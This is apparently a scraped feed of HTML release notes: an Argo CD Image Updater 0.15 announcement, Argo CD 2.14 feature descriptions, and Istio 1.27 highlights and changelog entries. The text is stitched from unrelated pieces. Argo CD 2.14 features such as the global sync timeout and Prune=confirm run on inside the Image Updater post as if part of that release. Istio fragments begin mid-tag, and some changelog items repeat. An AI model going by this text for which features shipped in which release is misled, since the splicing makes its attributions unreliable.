      "summary": "<h3>New Release for Argo CD Image Updater — 0.15</h3><p>We are pleased to announce a brand new release of Argo CD Image Updater, the companion controller to Argo CD for automatically updating container images in Argo CD applications. Read on for more details.</p><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*Tjl-5vVWKCnW3DIcfiyZHg.jpeg\" /></figure><p>Argo CD Image Updater is a project <a href=\"https://argocd-image-updater.readthedocs.io/en/stable/\">available at Argo Labs</a>. You can use it to automatically monitor your container registries and instruct your applications to perform a redeployment when a new version of a container is available. This means that you can gain the benefits of continuous delivery without the need of custom pipelines for updating your Kubernetes manifest.</p><p>This <a href=\"https://github.com/argoproj-labs/argocd-image-updater/releases/tag/v0.15.0\">release</a> includes 6 new features, 16 fixes and several documentation updates.</p><p>Here are some highlights:</p><h3>Support of other namespaces apart from “argocd”</h3><p>Traditionally all Argo CD application manifests are deployed in the “argocd” namespace. In recent versions of Argo CD you can now use any namespace for your applications (argocd is still the default).</p><p>There is now support for making Argo CD Image Updater work with Argo CD applications that are not on the argocd namespace.</p><p>Thanks <a href=\"https://github.com/sribiere-jellysmack\">S Ribiere</a> (Jellysmack) for implementing <a href=\"https://github.com/argoproj-labs/argocd-image-updater/pull/763\">this feature</a>.</p><h3>Preserve field order when updating Kustomize files</h3><p>Argo CD Image Updater has built-in support for Kustomize applications. If the <a href=\"https://argocd-image-updater.readthedocs.io/en/stable/basics/update-methods/#git-write-back-method\">Git write back method</a> is used, Argo CD Image Updater can also update the container image in the kustomization YAML file of the application.</p><p>Unfortunately the field order was not preserved. This means that running “git diff” (or using Argo CD) would show inconsistent changes that were not related to the image update.</p><p>Now Argo CD Image Updater will preserve the existing field order before and after the update in a predictable manner making automation with other tools much easier.</p><p>Thanks <a href=\"https://github.com/jtdoepke\">Jaye Doepke</a> (Mintel) for implementing <a href=\"https://github.com/argoproj-labs/argocd-image-updater/pull/666\">this feature</a>.</p><h3>Updating multiple images when using Helm value files</h3><p>Apart from Kustomize, Argo CD Image Updater can also monitor Helm charts and automatically update container tags mentioned in Helm value files.</p><p>In the most typical case a single Helm application will contain a single container image reference. Argo CD Image Updater will correctly detect the new version of the image and update it on the value files.</p><p>Sometimes however a single Helm application will contain multiple container tags. In this case Argo CD Image Updater would detect changes in all images but only update one of them. This process was now updated and now Argo CD Image Updater will work correctly with multi-image applications with the expected behavior.</p><p>Thanks <a href=\"https://github.com/ljupchokotev\">Lyupcho Kotev</a> (Codira AB) for implementing <a href=\"https://github.com/argoproj-labs/argocd-image-updater/pull/790\">this feature</a>.</p><h3>Updating Argo CD applications when auto-sync is disabled</h3><p>The main benefit of Argo CD Image Updater is fully automating all application deployments. A new container image is published in the registry, Argo CD Image Updater detects it and writes back to Git, Argo CD takes over and syncs all changes.</p><p>Some organizations however do not employ the auto-sync behavior of Argo CD. This can happen in several cases when deployments must happen manually (usually in production environments). In those scenarios Argo CD Image Updater would not “see” the updated image in the live application (as it was never deployed by Argo CD). This makes Argo CD Image Updater fall in a constant loop where it tries to update the same image again and again, but Argo CD does not deploy anything since auto-sync is disabled.</p><p>This behavior has now changed and Argo CD Image Updater will work even for Argo CD applications where auto-sync is disabled. Argo CD Image Updater will update the image only once as expected and then skip any further changes even if they are not yet on the live application definition.</p><p>Thanks <a href=\"https://github.com/Fs02\">Surya Asriadie</a> (Smart News) for implementing <a href=\"https://github.com/argoproj-labs/argocd-image-updater/pull/607\">this feature</a>.</p><h3>Support for Argo CD multi-source application sets</h3><p>Argo CD Image Updater recently gained support for <a href=\"https://argo-cd.readthedocs.io/en/stable/user-guide/multiple_sources/\">multi-source applications</a>. The basic functionality worked great for individual applications, but in the case of <a href=\"https://argo-cd.readthedocs.io/en/latest/user-guide/application-set/\">Application Sets</a> Argo CD Image Updater could not locate the type of each application (chart/kustomize/manifest) from the resource specification.</p><p>Now Argo CD Image Updater detects the type of each application from the status field of the resource, allowing you to automatically update images even if you employ Application Sets in your organization.</p><p>Thanks <a href=\"https://github.com/Sovietaced\">Jason Parraga</a> (Stack AV) for implementing <a href=\"https://github.com/argoproj-labs/argocd-image-updater/pull/772\">this feature</a>.</p><h3>Improved release process and unit testing</h3><p>As <a href=\"https://blog.argoproj.io/new-release-for-argo-image-updater-0-13-1fa3ef11996f\">promised in the previous release</a>, there were several other internal changes in the project in areas of integration testing and better contributor experience. Even though these changes do not correspond to use-visible features, they are crucial for helping newcomers to the project and accepting new features. We are always looking for ways to attract contributors and making the developer experience an easy process is always a constant goal for us.</p><p>Multiple people were involved in this effort. See all changes <a href=\"https://github.com/argoproj-labs/argocd-image-updater/releases/tag/v0.15.0\">in the release notes</a>.</p><h3>Where to report issues with the release</h3><p>If you would like to contribute new features to Argo CD Image Updater, please submit a pull request as usual.</p><p>If you find any issues with the release please find us on the #argo-cd-image-updater channel in the <a href=\"https://cloud-native.slack.com/messages/CHY2THYUU\">CNCF Slack instance</a>.

As always, we appreciate your feedback on any bugs or issues you encounter.</p><p>Now, let’s dive into the details.</p><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*9ANBGyCAjfUW5J_v6cm8SA.png\" /></figure><h4><strong>Global Sync Timeout for Applications</strong></h4><p>The global sync timeout feature addresses issues where the sync process gets stuck indefinitely, often due to resources failing to start properly and continuously retrying. Now, a global timeout can be configured on the Argo CD Controller to timeout long-running sync operations thanks to <a href=\"https://github.com/andrii-korotkov-verkada\">Andrii Korotkov</a> (Verkada)!</p><p>You can configure the timeout by updating controller.sync.timeout.seconds in the <a href=\"https://argo-cd.readthedocs.io/en/release-2.14/operator-manual/argocd-cmd-params-cm-yaml/\">argocd-cmd-params-cm configmap</a>.</p><h4><strong>Upgrading Helm to 3.16.2 and adding skipSchemaValidation Flag</strong></h4><p>Helm 3.16 exposes the--skip-schema-validation flag for the helm template command which is now available via the <a href=\"https://argo-cd.readthedocs.io/en/latest/user-guide/helm/#helm-skip-schema-validation\">argocd cli and Application spec.</a> --skip-schema-validation allows users to bypass schema validation—a crucial feature for offline clusters where external schemas are inaccessible. Additionally, Istio 1.24 requires Helm 3.16 or higher.</p><p>Contributed by dmosesson!</p><h4>Application Resource Deletion Protection</h4><p>New <a href=\"https://argo-cd.readthedocs.io/en/release-2.14/user-guide/sync-options/#resource-pruning-with-confirmation\">sync options</a> are now available to help prevent accidental resource deletion. This functionality is particularly useful when Argo CD is used to manage critical resources such as namespaces, volumes, or ingresses in a production environment. Accidental deletion of such resources can lead to data loss or service downtime, necessitating human approval. To enable this functionality, apply the argocd.argoproj.io/sync-options: Prune=confirm annotation to the desired Kubernetes resource. Once the annotation is in place, Argo CD will require manual approval before pruning the resource during application synchronization. Similarly, the argocd.argoproj.io/sync-options: Delete=confirm annotation alters the application deletion process. When this annotation is applied, Argo CD will prompt for confirmation before performing a cascading deletion of the application.</p><p>Thanks to <a href=\"https://github.com/alexmt\">Alexander Matyushentsev</a> (Akuity)!</p><h4><strong>Disable Server Side Apply on individual resources</strong></h4><p>Argo CD introduced server-side apply in v2.10, enhancing how resource changes are managed by leveraging Kubernetes’ native capabilities for conflict resolution and declarative updates. Now, it supports disabling server-side apply at the individual resource level, providing greater flexibility and control over specific resource configurations. Added by <a href=\"https://github.com/pasha-codefresh\">Pasha Kostohrys</a> (Codefresh)!</p><h4><strong>Disable writing K8s Events</strong></h4><p>In environments with many applications or high application churn, Argo CD can cause load on the Kubernetes API server and etcd with the number of events it produces. Operators can now disable the writing of Kubernetes events or tune the ones Argo CD produces.</p><p>Introduced by <a href=\"https://github.com/Jack-R-lantern\">Jack-R-lantern</a>!</p><h4>Faster Application Refreshes</h4><p>When Argo CD manages a cluster with many resources, like tens of thousands of pods and replicasets, it is slow to process changes across the resources. The Argo CD UI becomes particularly slow.</p><p>Thanks to <a href=\"https://github.com/mpelekh\">Mykola Pelekh</a>, you can now configure batches that reduce lock contention and increase the refresh speed!

href=\"https://gateway-api-inference-extension.sigs.k8s.io/\">Gateway API Inference Extension</a> is an official Kubernetes project designed to optimize the self-hosting of Generative AI models on Kubernetes. It provides a standardized, vendor-neutral approach to intelligent AI traffic management.</p>\n<p>Istio 1.27 includes a <a href=\"https://gateway-api-inference-extension.sigs.k8s.io/implementations/gateways/#istio\">fully-compliant implementation</a> of the extension when using the Gateway API for cluster ingress traffic control.</p>\n<p><a href=\"https://istio.io/blog/2025/inference-extension-support/\">Learn more about the extension and Istio&rsquo;s implementation</a>.</p>\n<h3 id=\"ambient-multicluster\">Ambient Multicluster</h3>\n<p>Support for multi-cluster deployments in ambient mode is now available in Alpha. This enables multiple ambient mode clusters to be connected into the same mesh, expanding the scope of no-sidecar networking to larger and more distributed environments.</p>\n<p>In this initial release, testing has been focused on multi-network, multi-primary topologies, where each cluster runs its own control plane. Support for more complex topologies will follow as the baseline feature matures.</p>\n<h3 id=\"crl-support-for-plugged-in-cas\">CRL Support for Plugged-in CAs</h3>\n<p>Certificate Revocation List (CRL) support is now available for users who have &ldquo;plugged in&rdquo; their own certificate authority, rather than using the default provided by Istio.  This allows proxies to validate and reject revoked certificates, strengthening the security posture of mesh deployments using plugged-in CAs.</p>\n<h3 id=\"listenersets-support\">ListenerSets Support</h3>\n<p>The new <a href=\"https://gateway-api.sigs.k8s.io/geps/gep-1713\">ListenerSets</a> API allows you to define a reusable set of listeners that can be attached to a <code>Gateway</code> resource. This promotes consistency and reduces duplication when managing multiple Gateways that share common listener configurations.</p>\n<h3 id=\"native-nftables-support-in-sidecar-mode\">Native nftables Support in Sidecar Mode</h3>\n<p>Istio now supports the <a href=\"https://github.com/istio/istio/issues/47821\">native nftables</a> backend in Sidecar mode. nftables is the modern successor to iptables, providing better performance, improved maintainability, and more flexible rule management for transparent traffic redirection to and from the Envoy sidecar proxy.</p>\n<p>Many major Linux distributions are adopting nftables as the default packet filtering framework, and Istio’s native support ensures compatibility with this shift.</p>\n<p>Support for nftables in ambient mode is actively being developed and will arrive in a future release.</p>\n<h2 id=\"upgrading-to-127\">Upgrading to 1.27</h2>\n<p>We would like to hear from you regarding your experience upgrading to Istio 1.27. You can provide feedback in the <code>#release-1.27</code> channel in our <a href=\"https://slack.istio.io/\">Slack workspace</a>.</p>\n<p>Would you like to contribute directly to Istio?

      "summary": "<h2 id=\"traffic-management\">Traffic Management</h2>\n<ul>\n<li>\n<p><strong>Updated</strong> traffic distribution to disregard subzone when the Kubernetes Service <code>trafficDistribution</code> field is set to <code>PreferClose</code>. (<a href=\"https://github.com/istio/istio/issues/55848\">Issue #55848</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> support for multiple server certificates in gateway (istio &amp; Gateway API). (<a href=\"https://github.com/istio/istio/issues/36181\">Issue #36181</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> alpha support for specifying <code>ServiceScope</code> in the MeshConfig in ambient multicluster configurations.\n<code>ServiceScope</code> enables the selection of individual services or services in a namespace to be global or local.\nA locally scoped service is only discoverable by the data plane in the same cluster as the service. A local\nservice is not discoverable by the data planes in other clusters. A globally-scoped service is discoverable\nby the data planes in all clusters. Defining selectors for the <code>serviceScopeConfigs</code> determines which services\nand workloads are shared with the data plane and which clusters and listeners are configured for the waypoints\n(including e/w gateways) in the mesh.</p>\n</li>\n<li>\n<p><strong>Added</strong> feature flag <code>EnableGatewayAPICopyLabelsAnnotations</code> to allow\nusers to choose whether the deployment resources will inherit attributes from\nthe parent Gateway API resource. This feature is enabled by default.</p>\n</li>\n<li>\n<p><strong>Added</strong> support for <code>PreferSameNode</code> and <code>PreferSameZone</code> on the Kubernetes Service <code>trafficDistribution</code> field.  (<a href=\"https://github.com/istio/istio/issues/55848\">Issue #55848</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> Pilot environment variables <code>PILOT_IP_AUTOALLOCATE_IPV4_PREFIX</code> and <code>PILOT_IP_AUTOALLOCATE_IPV6_PREFIX</code> to configure the IP CIDR prefix(es) for auto-allocated IPs. This allows users to set a specific range of IPs for auto-allocation, providing more control over the IP address space used for VIPs by the ipallocate controller.</p>\n</li>\n<li>\n<p><strong>Added</strong> logging of a secret&rsquo;s namespace and name when a certificate is invalid.\n(<a href=\"https://github.com/istio/istio/issues/56651\">Issue #56651</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> support for <a href=\"https://gateway-api-inference-extension.sigs.k8s.io/\">Gateway API Inference Extension</a>.\nThis feature is off by default and can be turned on with the <code>SUPPORT_GATEWAY_API_INFERENCE_EXTENSION</code> environment variable.\n(<a href=\"https://github.com/istio/istio/issues/55768\">Issue #55768</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> support for merge operations when applying to <code>LISTENER_FILTER</code> in EnvoyFilter.</p>\n</li>\n<li>\n<p><strong>Added</strong> feature <code>ENABLE_LAZY_SIDECAR_EVALUATION</code> that allows to enable lazy initialization of sidecar resources,\nOnly computing internal indexes when <code>SidecarScopes</code> are actually used by a Proxy. This feature supersedes the\nprevious <code>PILOT_CONVERT_SIDECAR_SCOPE_CONCURRENCY</code> which would allow concurrent conversion with specific given concurrency,\ninstead <code>ENABLE_LAZY_SIDECAR_EVALUATION</code> will use the same concurrency as <code>PILOT_PUSH_THROTTLE</code>.</p>\n</li>\n<li>\n<p><strong>Added</strong> support for native <code>nftables</code> when using Istio sidecar mode. This update makes it possible to use <code>nftables</code>\ninstead of iptables to manage network rules, offering more efficient approach to traffic redirection for pods and\nservices. To enable the <code>nftables</code> mode, use <code>--set values.global.nativeNftables=true</code> at the time of installation.  (<a href=\"https://github.com/istio/istio/issues/56487\">Issue #56487</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> support for specifying traffic distribution mode for services. (<a href=\"https://github.com/istio/istio/issues/53354\">Issue #53354</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> feature <code>ENABLE_PROXY_FIND_POD_BY_IP</code> that allows enabling association of Pods to Proxies by IP address, if the association by name and namespace fails.</p>\n</li>\n<li>\n<p><strong>Added</strong> support of retry budget in <code>DestinationRule</code> resources.</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where the gateway status controller leader election was not running per revision, which could lead to issues in multi-revision setups.\nThe leader election is now correctly scoped to each revision, ensuring that the gateway status controller operates independently for each revision.\n(<a href=\"https://github.com/istio/istio/issues/55717\">Issue #55717</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where virtual service routes were ignored when the virtual service was configured with hosts containing mixed-case letters.\n(<a href=\"https://github.com/istio/istio/issues/55767\">Issue #55767</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> a regression in Istio 1.26.0 that caused a panic in istiod when processing Gateway API hostnames.\n(<a href=\"https://github.com/istio/istio/issues/56300\">Issue #56300</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where mTLS was disabled unexpectedly when <code>PILOT_ENABLE_TELEMETRY_LABEL</code> or <code>PILOT_ENDPOINT_TELEMETRY_LABEL</code> was set to <code>false</code>\n(<a href=\"https://github.com/istio/istio/issues/56352\">Issue #56352</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where ambient host network iptables rules were being skipped due to higher-priority CNI rules in some deployments.\n(<a href=\"https://github.com/istio/istio/issues/56414\">Issue #56414</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where <code>EnvoyFilter</code> with <code>targetRefs</code> matched incorrect resources.\n(<a href=\"https://github.com/istio/istio/issues/56417\">Issue #56417</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> ambient index to filter configurations by their revision.\n(<a href=\"https://github.com/istio/istio/issues/56477\">Issue #56477</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where the <code>topology.istio.io/network</code> label was not properly skipped on the system namespace when <code>discoverySelectors</code> were in use.\n(<a href=\"https://github.com/istio/istio/issues/56687\">Issue #56687</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where the CNI plugin incorrectly handled pod deletion when the pod was not yet marked as enrolled in the mesh. In some cases, this could cause a pod, which had been deleted, to be included in the ZDS snapshot and never cleaned up. If this occurred, ztunnel would not be able to become ready.  (<a href=\"https://github.com/istio/istio/issues/56738\">Issue #56738</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where Istio&rsquo;s outbound route configuration did not include the absolute domain name  (fully-qualified domain name with trailing dot) in the domains list for <code>VirtualHost</code> entries. This change ensures that requests using absolute domain names (ending with a dot, e.g., <code>my-service.my-ns.svc.cluster.local.</code>) are properly routed to the intended service instead of falling back to <code>PassthroughCluster</code>.\n(<a href=\"https://github.com/istio/istio/issues/56007\">Issue #56007</a>)</p>\n</li>\n</ul>\n<h2 id=\"security\">Security</h2>\n<ul>\n<li>\n<p><strong>Added</strong> support for omitting the issuer claim in JWT tokens. Either the issuer claim or a <code>JWKSUri</code> is required,\nbut not both. This allows for more flexible configurations when using JWT tokens for authentication, particularly\nin scenarios where the issuer claim may be dynamic. (<a href=\"https://github.com/istio/istio/issues/14400\">Issue #14400</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> an opt-in feature when using istio-cni in ambient mode, to create an Istio-owned CNI config\nfile which contains the contents of the primary CNI config file and the Istio CNI plugin. This\nopt-in feature is a solution to the issue of traffic bypassing the mesh on node restart when the\nIstio CNI <code>DaemonSet</code> is not ready, the Istio CNI plugin is not installed, or the plugin is not\ninvoked to configure traffic redirection from pods their node ztunnels. This feature is enabled by\nsetting <code>cni.istioOwnedCNIConfig</code> to true in the istio-cni Helm chart values. If no value is set for\n<code>cni.istioOwnedCNIConfigFilename</code>, the Istio-owned CNI config file will be named <code>02-istio-cni.conflist</code>.\nThe <code>istioOwnedCNIConfigFilename</code> value must have a higher lexicographical priority than the primary CNI.\nAmbient and chained CNI plugins must be enabled for this feature to work.</p>\n</li>\n<li>\n<p><strong>Added</strong> validation for the istioctl <code>--clusterAliases</code> command argument. It should not have more than one alias per cluster.  (<a href=\"https://github.com/istio/istio/issues/56022\">Issue #56022</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> support for <code>ClusterTrustBundle</code> by migrating from <code>certificates.k8s.io/v1alpha1</code> to the stable <code>v1beta1</code> API in Kubernetes 1.33+. This improves compatibility and future-proofs Istio’s certificate distribution mechanism.\n(<a href=\"https://github.com/istio/istio/issues/56306\">Issue #56306</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> support for external Secret Discovery Service (SDS) providers in the Gateway TLS configuration. Istio now provides\nimproved integration with external SDS providers for TLS certificate management at the Gateway.\n(<a href=\"https://github.com/istio/istio/issues/56522\">Issue #56522</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> certificate revocation list (CRL) support for plugged-in CAs, enabling Istio to watch for <code>ca-crl.pem</code> files and\nautomatically distribute CRLs across all namespaces in the cluster. This enhancement allows\nproxies to validate and reject revoked certificates, strengthening the security posture of service mesh deployments\nusing plugged-in CAs.  (<a href=\"https://github.com/istio/istio/issues/56529\">Issue #56529</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> the Post-Quantum Cryptography (PQC) option to <code>COMPLIANCE_POLICY</code>.\nThis policy enforces TLS <code>v1.3</code>, cipher suites <code>TLS_AES_128_GCM_SHA256</code> and <code>TLS_AES_256_GCM_SHA384</code>,\nand post-quantum-safe key exchange <code>X25519MLKEM768</code>.\nTo enable this compliance policy in ambient mode, it must be set in the pilot and ztunnel containers.\nThis policy applies to the following data paths:</p>\n<ul>\n<li>mTLS communication between Envoy proxies and ztunnels;</li>\n<li>regular TLS on the downstream and the upstream of Envoy proxies (e.g. gateway);</li>\n<li>Istio xDS server.\n(<a href=\"https://github.com/istio/istio/issues/56330\">Issue #56330</a>)</li>\n</ul>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where sidecars with the old <code>CLUSTER_ID</code> setting were not able to connect to istiod with the new <code>CLUSTER_ID</code> settings when <code>--clusterAliases</code> command argument was being used.\n(<a href=\"https://github.com/istio/istio/issues/56022\">Issue #56022</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue in the <code>pluginca</code> feature where <code>istiod</code> would silently fallback to the self-signed CA if the provided <code>cacerts</code> bundle was incomplete.\nThe system now properly validates the presence of all required CA files and fails with an error if the bundle is incomplete.</p>\n</li>\n</ul>\n<h2 id=\"telemetry\">Telemetry</h2>\n<ul>\n<li>\n<p><strong>Fixed</strong> an issue where Grafana dashboard was linking to the Istio Mesh Dashboard using path-based links that no longer work. Workload and Service links now use dashboard UIDs.\n(<a href=\"https://github.com/istio/istio/issues/50124\">Issue #50124</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where access logs were not being updated when the referenced service was created later than the Telemetry resource.\n(<a href=\"https://github.com/istio/istio/issues/56825\">Issue #56825</a>)</p>\n</li>\n<li>\n<p><strong>Removed</strong> support of the <code>Lightstep</code> tracing provider.\n(<a href=\"https://github.com/istio/istio/issues/54002\">Issue #54002</a>)</p>\n</li>\n</ul>\n<h2 id=\"extensibility\">Extensibility</h2>\n<ul>\n<li><strong>Added</strong> an option to reload the Wasm VM on new requests if the VM has failed.</li>\n</ul>\n<h2 id=\"installation\">Installation</h2>\n<ul>\n<li>\n<p><strong>Promoted</strong> the environment variable <code>ENABLE_NATIVE_SIDECARS</code> to default to <code>true</code>. This means native sidecars will be injected into all eligible pods unless explicitly disabled.\nThis can be disabled explicitly or for specific workloads by adding the annotation <code>sidecar.istio.io/native-side: &quot;false&quot;</code> to individual pods or pod templates.\n(<a href=\"https://github.com/istio/istio/issues/48794\">Issue #48794</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> a setting <code>values.global.trustBundleName</code> that allows configuring the name of the ConfigMap that istiod uses to propagate its root CA certificate in the cluster. This allows running multiple control planes with overlapping namespaces in the same cluster.</p>\n</li>\n<li>\n<p><strong>Added</strong> support for customizing ambient enablement Labels.\n(<a href=\"https://github.com/istio/istio/issues/53578\">Issue #53578</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> support for configuring <code>additionalContainers</code> and <code>initContainers</code> on the Gateway Helm Chart.</p>\n</li>\n<li>\n<p><strong>Added</strong> support for configuring ztunnel tolerations via Helm chart values.\n(<a href=\"https://github.com/istio/istio/issues/56086\">Issue #56086</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> support for configuring istio-cni tolerations via Helm chart values.\n(<a href=\"https://github.com/istio/istio/issues/56087\">Issue #56087</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> defined defaults for <code>GOMEMLIMIT</code> and <code>GOMAXPROCS</code> divisors to fix an Argo perpetual out-of-sync issue.</p>\n</li>\n<li>\n<p><strong>Added</strong> bootstrap override config for the <code>gateway-injection-template</code>.\n(<a href=\"https://github.com/istio/istio/issues/28302\">Issue #28302</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> <code>ENABLE_NATIVE_SIDECARS</code> Helm value in the compatibility profiles of Istio 1.24, 1.25, and 1.26, allowing users to disable the default enabling of native sidecars.</p>\n</li>\n<li>\n<p><strong>Added</strong> support for proxy protocol on status port. (<a href=\"https://istio.io/docs/reference/commands/pilot-agent/#envvars\">reference</a>)\n(<a href=\"https://github.com/istio/istio/issues/39868\">Issue #39868</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> Helm value <code>.Values.istiodRemote.enabledLocalInjectorIstiod</code> to support sidecar injection in remote clusters.\nWhen <code>profile=remote</code>, <code>.Values.istiodRemote.enabledLocalInjectorIstiod=true</code>, and <code>.Values.global.remotePilotAddress=&quot;${DISCOVERY_ADDRESS}&quot;</code>,\nthe remote worker cluster installs <code>istiod</code> for local sidecar injection, while XDS is still served by the remote primary cluster.\n(<a href=\"https://github.com/istio/istio/issues/56328\">Issue #56328</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> the <code>istio.io/rev</code> label to the istio remote service when <code>istiodRemote</code> is enabled\n(<a href=\"https://github.com/istio/istio/issues/56142\">Issue #56142</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> support for <code>deploymentAnnotations</code> in the istiod Helm chart. Users can now specify custom annotations to be applied to the istiod Deployment object, in addition to the existing <code>podAnnotations</code> support. This is useful for integration with monitoring tools, GitOps workflows, and policy enforcement systems that operate at the deployment level.</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where the <code>ISTIO_KUBE_APP_PROBERS</code> environment variable was not set for probe rewrites when the Istio webhook was re-invoked.\n(<a href=\"https://github.com/istio/istio/issues/56102\">Issue #56102</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where secrets references in the env of <code>istio/gateway</code> Helm chart were incorrectly rendered as a string.\n(<a href=\"https://github.com/istio/istio/issues/55141\">Issue #55141</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an injection failure that occurred when the <code>gateway</code> template was combined with another template, like <code>spire</code>,\nwhich overrides <code>workload-socket</code>, resulted in Kubernetes not creating other volumes, like those with <code>emptyDir</code> and <code>csi</code> settings.</p>\n</li>\n<li>\n<p><strong>Fixed</strong> a panic in <code>istioctl manifest translate</code> when the <code>IstioOperator</code> config contained multiple gateways.\n(<a href=\"https://github.com/istio/istio/issues/56223\">Issue #56223</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> assignment of incorrect UIDs and GIDs for <code>istio-proxy</code> and <code>istio-validation</code> containers on OpenShift clusters when TPROXY mode was enabled.</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where <code>ClusterTrustBundle</code> was not properly configured when <code>ENABLE_CLUSTER_TRUST_BUNDLE_API</code> was enabled.</p>\n</li>\n<li>\n<p><strong>Removed</strong> unused multicluster-related Helm values.</p>\n</li>\n</ul>\n<h2 id=\"istioctl\">istioctl</h2>\n<ul>\n<li>\n<p><strong>Added</strong> the <code>--kubeclient-timeout</code> flag to <code>istioctl</code> root flags. May be unset, or set to a valid <code>time.Duration</code> string.\nWhen specified, this will override the default <code>15s</code> timeout for all <code>istioctl</code> commands that use the Kubernetes client.\nThis is useful for environments with slow Kubernetes API servers, such as those with high latency or low bandwidth.\nNote that this flag is just used for the Kubernetes client, and does not affect other timeouts in <code>istioctl</code>, such as\ninstallation timeouts. (<a href=\"https://github.com/istio/istio/issues/54962\">Issue #54962</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> <code>--revision</code> flags for <code>istioctl dashboard controlz</code> and <code>istioctl dashboard istiod-debug</code>.</p>\n</li>\n<li>\n<p><strong>Added</strong> support in the <code>istioctl proxy-status</code> command to dynamically display all xDS/CRD types as columns in the output table.\n(<a href=\"https://github.com/istio/istio/issues/56005\">Issue #56005</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> support for customizing the timeout of <code>istioctl waypoint status</code> and <code>istioctl waypoint apply</code>.\n(<a href=\"https://github.com/istio/istio/issues/56453\">Issue #56453</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> support for displaying <code>stack-trace-level</code> in the command <code>istioctl admin log</code>.\n(<a href=\"https://github.com/istio/istio/issues/56465\">Issue #56465</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> support for displaying <code>traffic type</code> in the command <code>istioctl waypoint list</code>.</p>\n</li>\n<li>\n<p><strong>Added</strong> support for the <code>--weight</code> parameter in the command <code>istioctl experimental workload group create</code>.</p>\n</li>\n<li>\n<p><strong>Added</strong> support for configuring the log level of <code>ip-autoallocate</code> in <code>istioctl admin log</code>.\n(<a href=\"https://github.com/istio/istio/issues/55741\">Issue #55741</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where, during installation, <code>istio-revision-tag-default</code> and <code>MutatingWebhookConfiguration</code> were not created when the revision was not the default.\n(<a href=\"https://github.com/istio/istio/issues/55980\">Issue #55980</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where false positive of IST0134 were raised in <code>istioctl analyze</code> when <code>PILOT_ENABLE_IP_AUTOALLOCATE</code> was set to <code>true</code>.\n(<a href=\"https://github.com/istio/istio/issues/56083\">Issue #56083</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where analysis included Kubernetes system namespaces (e.g., <code>kube-system</code>, <code>kube-node-lease</code>).\n(<a href=\"https://github.com/istio/istio/issues/55022\">Issue #55022</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where <code>create-remote-secret</code> created redundant RBAC resources.\n(<a href=\"https://github.com/istio/istio/issues/56558\">Issue #56558</a>)</p>\n</li>\n</ul>",

iptables binary detection logic has been improved to verify a degree of baseline kernel support exists, and prefer <code>nft</code> in a <code>tie</code> situation.</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue causing false positives with <code>istioctl analyze</code> raising IST0134 even when <code>PILOT_ENABLE_IP_AUTOALLOCATE</code> was set to <code>true</code>.\n(<a href=\"https://github.com/istio/istio/issues/56083\">Issue #56083</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> a panic in <code>istioctl manifest translate</code> when the IstioOperator config contained multiple gateways.\n(<a href=\"https://github.com/istio/istio/issues/56223\">Issue #56223</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> ambient index to filter configs by revision.\n(<a href=\"https://github.com/istio/istio/issues/56477\">Issue #56477</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> incorrect UID and GID assignment for <code>istio-proxy</code> and <code>istio-validation</code> containers on OpenShift when TPROXY mode was enabled.</p>\n</li>\n<li>\n<p><strong>Fixed</strong> logic to properly ignore the <code>topology.istio.io/network</code> label on the system namespace when <code>discoverySelectors</code> are in use.\n(<a href=\"https://github.com/istio/istio/issues/56687\">Issue #56687</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where access logs were not updated when the referenced service was created later than the Telemetry resource.

